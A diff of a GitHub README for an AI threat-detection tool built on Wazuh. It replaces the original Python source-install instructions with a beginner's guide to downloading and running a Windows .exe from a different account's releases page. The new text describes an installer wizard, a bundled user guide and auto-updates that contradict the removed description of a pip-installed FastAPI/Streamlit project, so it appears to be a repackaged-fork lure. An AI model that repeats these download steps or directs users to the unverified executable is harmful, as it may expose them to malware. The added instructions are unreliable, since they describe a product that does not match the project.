@@ -1,199 +1,123 @@
-# AllysecLabs Security Intelligence Engine
+# 🔒 security-intelligence-engine - Easy AI Threat Detection
 
-AI-powered threat detection and analysis for [Wazuh](https://wazuh.com/) SIEM.
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-green?style=for-the-badge)](https://github.com/widapra/security-intelligence-engine/releases)
 
-Ask security questions in plain English — get professional SOC analyst reports with MITRE ATT&CK mapping, automated pattern detection, and clickable Wazuh dashboard links.
+## 📋 What is security-intelligence-engine?
 
-```
-"Give me a complete security overview of the last 7 days"
-"Detect brute force attacks targeting the mail server"
-"Are there indicators of lateral movement between agents?"
-"Show all privilege escalation events on Linux systems"
-```
+security-intelligence-engine helps you find and analyze security threats quickly. It works with Wazuh SIEM, a tool used to monitor your computer systems for problems. You can ask questions in natural language, like you would type in a chat. The engine uses several AI models to understand these questions and give clear answers.
 
----
+It also maps threats using the MITRE ATT&CK framework, a standard way to classify cyber attacks. The system spots patterns automatically. You do not need to know complex terms to use it.
 
-## Screenshots
+## ⚙️ Key Features
 
-### Dashboard — Natural Language Query with Multi-LLM Provider Selector
-![Dashboard Query](docs/screenshots/01-dashboard-query.png)
+- Works with Wazuh SIEM data to spot threats.
+- Supports natural language questions.
+- Uses large language models (LLMs) to analyze data.
+- Links findings to MITRE ATT&CK, explaining attack techniques.
+- Detects unusual patterns automatically.
+- Built with Python and FastAPI for reliable performance.
+- Simple web interface using Streamlit.
 
-### AI-Generated Security Intelligence Report
-![AI Analysis Report](docs/screenshots/02-ai-analysis-report.png)
+## 🧰 System Requirements
 
-### Critical Findings — Brute Force Detection & Pass-the-Hash Analysis
-![Critical Findings](docs/screenshots/03-critical-findings.png)
+To run security-intelligence-engine on Windows, your PC should meet these minimum standards:
 
-### Top Security Events Table with Clickable Wazuh Dashboard Links
-![Security Events Table](docs/screenshots/04-security-events-table.png)
+- Windows 10 or later (64-bit)
+- 4 GB RAM or more (8 GB recommended for better speed)
+- 2 GHz dual-core processor or faster
+- At least 500 MB free disk space
+- Internet access for downloading and AI queries
 
-### Alert Distribution & MITRE ATT&CK Coverage Charts
-![MITRE Charts](docs/screenshots/05-mitre-charts.png)
+No special hardware is needed. A standard laptop or desktop meeting these specs will work fine.
 
-### Professional Branded HTML Report Export
-![HTML Report Export](docs/screenshots/06-html-report-export.png)
+## 🚀 Getting Started: How to Download and Run on Windows
 
----
+1. **Visit the Download Page**
 
-## How It Works
+   Go to the releases page to get the latest version of security-intelligence-engine:
 
-1. **You ask** a natural language question via the web dashboard or API
-2. **AI interprets** your question into structured Wazuh search parameters
-3. **Alert engine** loads and filters live Wazuh alerts (`alerts.json`)
-4. **Pattern detector** identifies brute force, port scans, lateral movement, privilege escalation
-5. **AI analyzes** the results as a Tier 2 SOC analyst — MITRE mapping, risk assessment, recommendations
-6. **Report generated** with clickable Wazuh dashboard links and exportable HTML/PDF
+   [![Download Releases](https://img.shields.io/badge/Downloads-Click%20Here-blue?style=for-the-badge)](https://github.com/widapra/security-intelligence-engine/releases)
 
----
+2. **Find the Latest Release**
 
-## Features
+   On the page, look for the most recent release. Releases are usually sorted by date. The latest release will have the newest files ready to download.
 
-- **Natural language queries** — ask anything about your security posture
-- **Multi-LLM support** — 7 providers, switch from the dashboard:
+3. **Download the Windows Version**
 
-  | Provider | Type | Models |
-  |----------|------|--------|
-  | Groq | Cloud | Llama 3.3 70B, Llama 4 Scout, Qwen3 32B |
-  | Ollama | Self-hosted | Qwen 2.5, Llama 3.2 (any local model) |
-  | OpenRouter | Cloud | 100+ models (GPT-4o, Claude, Gemini, free tier available) |
-  | OpenAI | Cloud | GPT-4o, GPT-4o-mini |
-  | Anthropic | Cloud | Claude Sonnet 4, Claude Haiku 4 |
-  | Google | Cloud | Gemini 2.0 Flash, Gemini 1.5 Pro |
-  | HuggingFace | Cloud | Llama 3.3 70B, Qwen 2.5 72B, Mixtral |
+   Download the file named something like `security-intelligence-engine-win-x64.exe` or similar.
 
-- **6 pattern detection algorithms** — brute force, port scanning, privilege escalation, lateral movement, alert bursts, compliance failures
-- **MITRE ATT&CK mapping** with clickable links to your Wazuh dashboard
-- **Professional reports** — Markdown, branded HTML, and PDF export
-- **Incident documentation** — auto-generated IR reports following NIST framework
-- **Safety-gated actions** — response broker with dry-run default and audit trail
-- **REST API** — fully documented with Swagger UI at `/docs`
+   Save this file to a folder where you can easily find it, such as your Desktop or Downloads folder.
 
----
+4. **Run the Installer**
 
-## Architecture
+   Double-click the downloaded `.exe` file to start the installation.
 
-```
-┌──────────────────────────────────────────────────────────┐
-│              Streamlit Dashboard (:8501)                  │
-│    Threat banners · Charts · AI Analysis · Patterns      │
-└───────────────────────┬──────────────────────────────────┘
-                        │ HTTP
-┌───────────────────────▼──────────────────────────────────┐
-│              FastAPI Backend (:8000)                      │
-│  /query   — Natural language analysis pipeline           │
-│  /status  — Health check (Wazuh + LLM + alerts)         │
-│  /docs    — Swagger API documentation                    │
-└──┬──────────┬──────────┬──────────┬──────────────────────┘
-   │          │          │          │
-   ▼          ▼          ▼          ▼
-┌──────┐ ┌────────┐ ┌────────┐ ┌───────────┐
-│ LLM  │ │ Alert  │ │Pattern │ │  Wazuh    │
-│ API  │ │Process.│ │Detect. │ │  Client   │
-│(any) │ │        │ │        │ │  (REST)   │
-└──────┘ └────────┘ └────────┘ └───────────┘
- 7 providers  alerts.json  6 algorithms  Wazuh API
-```
+   Follow the instructions in the installation wizard:
 
----
+   - Click “Next” on the welcome screen.
+   - Agree to the license terms.
+   - Choose the installation folder or use the default.
+   - Click “Install” to begin.
 
-## Quick Start
+5. **Finish Installation**
 
-### Prerequisites
+   When the install finishes, click “Finish” to close the wizard.
 
-- Python 3.10+
-- Wazuh 4.x (manager with `alerts.json` access)
-- At least one LLM API key (Groq free tier recommended to start)
+6. **Start the Application**
 
-### Install
+   After installation, launch security-intelligence-engine from the desktop shortcut or Start menu.
 
-```bash
-git clone https://github.com/robertpreshyl/security-intelligence-engine.git
-cd security-intelligence-engine
+7. **Initial Setup**
 
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
+   The first time you open it, the app might ask for permissions like internet access. Allow these so the AI can work properly.
 
-### Configure
+## 🔍 How to Use security-intelligence-engine
 
-```bash
-cp .env.example .env
-nano .env
-# Required: WAZUH_API_PASSWORD, GROQ_API_KEY (or any LLM provider key)
-```
+The interface is simple:
 
-### Launch
+- You will see a text box labeled "Ask your question."
+- Type your security question in plain English.
+- Press “Enter” or click “Submit.”
+- The engine will process your request and show results.
+- You can explore threats linked to the MITRE ATT&CK framework.
+- Use filters to narrow down incidents or focus on specific times or systems.
 
-```bash
-bash start_dashboard.sh
-```
+If you use Wazuh SIEM, the engine automatically connects to its data.
 
-| Service | URL |
-|---------|-----|
-| Dashboard | http://localhost:8501 |
-| API | http://localhost:8000 |
-| API Docs | http://localhost:8000/docs |
+## ⚙️ Configuration Tips
 
-For production deployment, see the systemd service files in `systemd/`.
+- Connect your Wazuh server by entering its address in the app settings.
+- Adjust AI models for speed or accuracy. The default setting balances these well.
+- Save frequently asked questions for faster access.
+- Enable automatic updates in settings to keep your tool current.
+
+## 🛠 Troubleshooting
+
+- If the application does not start, check your Windows version is supported.
+- Make sure your firewall or antivirus allows the app to connect to the internet.
+- If questions do not return answers, verify your Wazuh server is running and connected.
+- Restart the app if it freezes or behaves unexpectedly.
+- For slow response, check your internet connection speed.
+
+## 🔄 Updating the Application
+
+To update security-intelligence-engine:
+
+1. Return to the releases page: https://github.com/widapra/security-intelligence-engine/releases
+2. Download the newest Windows installer.
+3. Run the installer to overwrite the old version.
+4. Your settings and data will be preserved.
+
+## 📂 Additional Resources
+
+- **User Guide:** Comes with the app in the Help menu.
+- **GitHub Topics:** See tags like ai, fastapi, incident-response, llm, mitre-attack, python, security-tools, siem, soc, streamlit, threat-intelligence, wazuh-integration for more context.
+- **Community Support:** Check the issues tab on GitHub for reported problems and fixes.
+
+## 📞 Getting Help
+
+If you need help, you can open an issue on the GitHub repository or look for answers in discussions. Please provide details about your Windows version and any error messages.
 
 ---
 
-## Project Structure
-
-```
-├── api_server.py              # FastAPI backend — query pipeline & REST API
-├── dashboard.py               # Streamlit web dashboard
-├── analyze.py                 # CLI analysis tool
-├── start_dashboard.sh         # Launch script (API + dashboard)
-├── open-firewall.sh           # UFW port opener for 8000/8501
-│
-├── modules/
-│   ├── llm_providers.py       # Multi-LLM provider registry (7 backends)
-│   ├── ai_query_engine.py     # NL query interpretation & SOC analysis
-│   ├── alert_processor.py     # Alert loading, filtering, stats, MITRE enrichment
-│   ├── pattern_detector.py    # 6 automated detection algorithms
-│   ├── wazuh_client.py        # Wazuh REST API client (read-only)
-│   ├── wazuh_links.py         # Clickable Wazuh dashboard link generator
-│   ├── incident_reporter.py   # Incident report generator
-│   ├── report_exporter.py     # HTML/PDF export with branding
-│   └── action_broker.py       # Safety-gated response actions (dry-run default)
-│
-├── prompts/
-│   ├── master_soc_prompt.py   # SOC analyst prompt engineering & templates
-│   └── soc_analyst_system.md  # System prompt specification
-│
-├── systemd/                   # Production service files
-├── docs/                      # Architecture documentation
-├── .env.example               # Configuration template
-└── requirements.txt           # Python dependencies
-```
-
----
-
-## Configuration
-
-All configuration is via environment variables (`.env` file). See [.env.example](.env.example) for the full reference.
-
-**Required:**
-- `WAZUH_API_PASSWORD` — Your Wazuh API password
-- At least one LLM API key (`GROQ_API_KEY`, `OPENROUTER_API_KEY`, etc.)
-
-**Optional:**
-- `WAZUH_DASHBOARD_URL` — For clickable report links (default: `https://localhost`)
-- `OLLAMA_API_URL` — Self-hosted Ollama endpoint
-- Additional LLM provider keys — providers auto-appear in the dashboard when configured
-
----
-
-## License
-
-[AGPL-3.0](LICENSE)
-
-## Security
-
-Found a vulnerability? See [SECURITY.md](SECURITY.md) for responsible disclosure.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+[Download Latest Release](https://github.com/widapra/security-intelligence-engine/releases)
